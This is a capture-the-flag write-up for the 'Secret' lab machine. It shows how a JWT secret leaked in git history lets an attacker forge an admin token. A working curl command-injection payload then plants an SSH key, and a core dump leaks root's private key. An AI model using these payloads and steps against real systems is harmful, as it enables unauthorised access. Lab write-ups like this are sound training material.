---
title: "Secret - Easy"
date: 2022-01-23
---

### Tools Used
- Nmap
- ![jwt.io](jwt.io)
- git
- apport-unpack
# User
### Enumeration
```
Nmap scan report for secret (10.10.11.120)
Host is up (0.060s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/23%OT=22%CT=1%CU=33531%PV=Y%DS=2%DC=T%G=Y%TM=61ED29D
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 18.014 days (since Wed Jan  5 04:52:02 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 23 05:11:39 2022 -- 1 IP address (1 host up) scanned in 39.61 seconds
```
 The initial nmap scans shows 3 active services:
- 1 SSH service open on port 22
- 1 HTTP service open on port 80 using nginx 1.18
- 1 HTTP service open on port 3000 using Node.js 

The webpage on port 80 shows Documentation of how to access and use an api. The webpage also includes a download link to download the source code of the webserver. The page shows how to register and login a new user by curling and using certain payloads.
![image1](/img/Secret/image1.png)
![image2](/img/Secret/image2.png)

The command:  `curl -X POST -H "Content-Type: application/json" -d '{"name": "ABC123", "email": "ABC@example.com", "password": "123456"}' http://10.10.11.120:3000/api/user/register/` is used to create a standard user account. Once this standard user account is created, the user can login using:  `curl -X POST -H "Content-Type: application/json" -d '{"email": "ABC@example.com", "password": "123456"}'  http://10.10.11.120:3000/api/user/login` . 

Like the Documentation states: we then get given the a JWT token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWVkMmFkMjE0NWM3ODA0NjM0YzU1YzQiLCJuYW1lIjoiQUJDMTIzIiwiZW1haWwiOiJBQkNAZXhhbXBsZS5jb20iLCJpYXQiOjE2NDI5MzI5NTV9.Gs8_uGR5GOOTZYbVCSD7PaefBRakM1DiQ-wnjMIj9gU`

### FootHold

![image3](/img/Secret/image3.png)
To gain access to the /priv/ directory on the webserver, the user must be an administrator. Viewing the source code, private.js shows the requirements of authorizing an administrator:
```js

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }

```
For the admin to be granted, the username must be "theadmin"

The example Decoding the example JWT token given to us `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmMDU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjI4NzI3NjY5fQ.PFJldSFVDrSoJ-Pg0HOxkGjxQ69gxVO2Kjn7ozw9Crg` can be decoded to show the following payload 

```
{
  "_id": "6114654d77f9a54e00f05777",
  "name": "theadmin",
  "email": "root@dasith.works",
  "iat": 1628727669
}
```

However reusing the example token to login does not work due to the verifytoken.js 

```js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
```
The current TOKEN_SECRET value stored in .env is "secret"
Using jwt.io, a jwt token can be forged to include the signature verification. Even after, the implementation of the secret, the verification will fail.

The existence of a .git file in the source code shows that there is likely a git repository with all the commit history of the repository. Viewing the git log, commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78 states "removed .env for security reasons"

Comparing the .env file before and after the commit shows the previous TOKEN_SECRET value:
```
diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Using the discovered token, a new jwt token can be forged, and with the requirement of the auth-token filled, Remote Code execution can be implemented. Due to port 22 being open, the easiest method of accessing user is to dump a ssh public key into the user's "authorized key file" which grants the attack access to the ssh server.

```
curl \
-i \
-H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkyMGU1MzQzNDAzMjA0NjQ1MjM0YjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IkFCQ0BleGFtcGxlLmNvbSIsImlhdCI6MTYzNjk2MjE1Nn0.CeB4nsKvRxnabY1eZ8ZZW7FFne4kkNtlWg9yB0Z5zS4' \
  -G \
--data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $sshkey1 >> /home/dasith/.ssh/authorized_keys" \
'http://10.10.11.120/api/logs'                                     
```


---
# Privilege Escalation 
Checking the files in the /opt/ directory, there are 2 files, code.c and its compiled version called "count". Running the code allows the attack to enter a file path or directory path:

If the user enters a Directory Path, all files and directories inside the specified one will be shown with their permissions. For example, only root has permissions for the .ssh directory
```
Enter source file/directory name: /root/
-rw-r--r--      .viminfo
drwxr-xr-x      ..
-rw-r--r--      .bashrc
drwxr-xr-x      .local
drwxr-xr-x      snap
lrwxrwxrwx      .bash_history
drwx------      .config
drwxr-xr-x      .pm2
-rw-r--r--      .profile
drwxr-xr-x      .vim
drwx------      .
drwx------      .cache
-r--------      root.txt
drwxr-xr-x      .npm
drwx------      .ssh

Total entries       = 15
Regular files       = 4
Directories         = 10
Symbolic links      = 1
Save results a file? [y/N]:

```

If the user enters a File Path, the program counts all characters, words and lines in the file.
```
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]:
```

Inspecting the code, shows that:
- the program runs temporarily in root to read directories and files.
- the program reads the file requested
-  the program has enable coredump generation
```c

void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
}

int main()
{

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);

}
```
With this knowledge, the attacker can read directories and files they do not have permission to. Viewing the root directory shows a ssh folder meaning there may be possibility of dumping root's ssh private key. 

### Core Dump

After using the program's directory and file search, root's ssh private key can be discovered in /root/ssh/id_rsa. To dump the file, bring the process to the background with ctrl+z after the program requests for the user to save the results. Active processes can be viewed by using the "ps" command. Match the Process ID associated with program and kill the process and bring the program back to the foreground to crash the program. Once the program is killed,  the core dump files can be located at /var/crashes. Using apport-unpack, the core dump can be made easier to read. From there the dump can be run through strings in order to find the private key. Once the key is retrieved, the attacker can ssh into root using the -i to allocate the private key. 